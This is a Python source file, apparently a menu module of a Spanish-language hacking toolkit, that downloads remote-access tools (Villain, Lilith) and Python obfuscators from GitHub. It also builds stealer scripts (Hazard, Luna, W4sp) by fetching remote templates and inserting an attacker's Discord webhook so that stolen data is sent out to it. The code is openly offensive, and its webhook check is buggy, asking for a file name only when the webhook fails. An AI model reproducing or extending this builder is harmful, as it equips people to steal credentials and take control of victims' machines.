from util.imports import Colors, System, get, ZipFile, path, remove
from util.MixedColors import Colors, MK4, MK5

def Villain():
    try:
        x = get('https://github.com/zEncrypte/Villain/archive/refs/heads/main.zip')
        with open("main.zip", 'wb')as z:
            z.write(x.content)
        
        with ZipFile("main.zip", 'r') as y:
            y.extractall(path=path.join(path.expanduser("~"), "Desktop"))
            remove("main.zip")

    except PermissionError:
        input(f" {MK4}[{MK5}*{MK4}] {Colors.white}Hubo un error al intentar borrar el archivo temporal.")

def Lilith():
    try:
        x = get('https://github.com/werkamsus/Lilith/archive/refs/heads/master.zip')
        with open("master.zip", 'wb')as z:
            z.write(x.content)
        
        with ZipFile("master.zip", 'r') as y:
            y.extractall(path=path.join(path.expanduser("~"), "Desktop"))
            remove("master.zip")

    except PermissionError:
        input(f" {MK4}[{MK5}*{MK4}] {Colors.white}Hubo un error al intentar borrar el archivo temporal.")

def Hyperion():
    x = get('https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/obfctrs/hyperion.py')
    f = open('hyperion.py', "w+", encoding="utf-8")
    f.write(x.text)
    f.close()

def Kramer():
    x = get('https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/obfctrs/kramer.py')
    f = open('kramer.py', "w+", encoding="utf-8")
    f.write(x.text)
    f.close()

def OldXor():
    x = get('https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/obfctrs/OldXor.py')
    f = open('OldXor.py', "w+")
    f.write(x.text)
    f.close()

def Apocalypse():
    x = get('https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/obfctrs/apocalypse.py')
    f = open('apocalypse.py', "w+")
    f.write(x.text)
    f.close()

def Blank():
    x = get('https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/obfctrs/blank.py')
    f = open('blank.py', "w+")
    f.write(x.text)
    f.close()

def Hazard():
    try:
        System.Clear()
        webhook = input(f"\n {MK4}[{MK5}*{MK4}]{Colors.white} Ingresa la Webhook {Colors.red}> {Colors.white}")
        if not check_webhook(webhook):
            filename = input(f" {MK4}[{MK5}*{MK4}]{Colors.white} Nombre del Archivo {Colors.red}> {Colors.white}")
        code = get("https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/hazard.py").text.replace("WEBHOOK_HERE", webhook)

        with open(f"{filename}.py", 'w', errors="ignore") as f:
            f.write(code)
        input(f" {MK4}[{MK5}*{MK4}] {Colors.white}Presiona enter para continuar...")

    except KeyboardInterrupt:
        Hazard()
    except EOFError:
        Hazard()
        
def Luna():
    try:
        System.Clear()
        webhook = input(f"\n {MK4}[{MK5}*{MK4}]{Colors.white} Ingresa la Webhook {Colors.red}> {Colors.white}")
        if not check_webhook(webhook):
            filename = input(f" {MK4}[{MK5}*{MK4}]{Colors.white} Nombre del Archivo {Colors.red}> {Colors.white}")
        code = get("https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/luna.py").text.replace("Webhook_here_bitch", webhook)

        with open(f"{filename}.py", 'w', errors="ignore") as f:
            f.write(code)
        input(f" {MK4}[{MK5}*{MK4}] {Colors.white}Presiona enter para continuar...")

    except KeyboardInterrupt:
        Luna()
    except EOFError:
        Luna()

def W4sp():
    try:
        System.Clear()
        webhook = input(f"\n {MK4}[{MK5}*{MK4}]{Colors.white} Ingresa la Webhook {Colors.red}> {Colors.white}")
        if not check_webhook(webhook):
            filename = input(f" {MK4}[{MK5}*{MK4}]{Colors.white} Nombre del Archivo {Colors.red}> {Colors.white}")
        code = get("https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/w4sp.py").text.replace("here", webhook)

        with open(f"{filename}.py", 'w', errors="ignore") as f:
            f.write(code)
        input(f" {MK4}[{MK5}*{MK4}] {Colors.white}Presiona enter para continuar...")

    except KeyboardInterrupt:
        W4sp()
    except EOFError:
        W4sp()


def check_webhook(hook):
    msg = '"Unknown Webhook"'
    info = get(hook).text
    if msg in info or 'discord.com/api/webhooks' not in hook:
        print()
        print(f" {MK4}[{Colors.red}!{MK4}]{Colors.white} Webhook Invalida")
        input(f" {MK4}[{Colors.red}!{MK4}]{Colors.white} Presiona enter para continuar")
        System.Clear()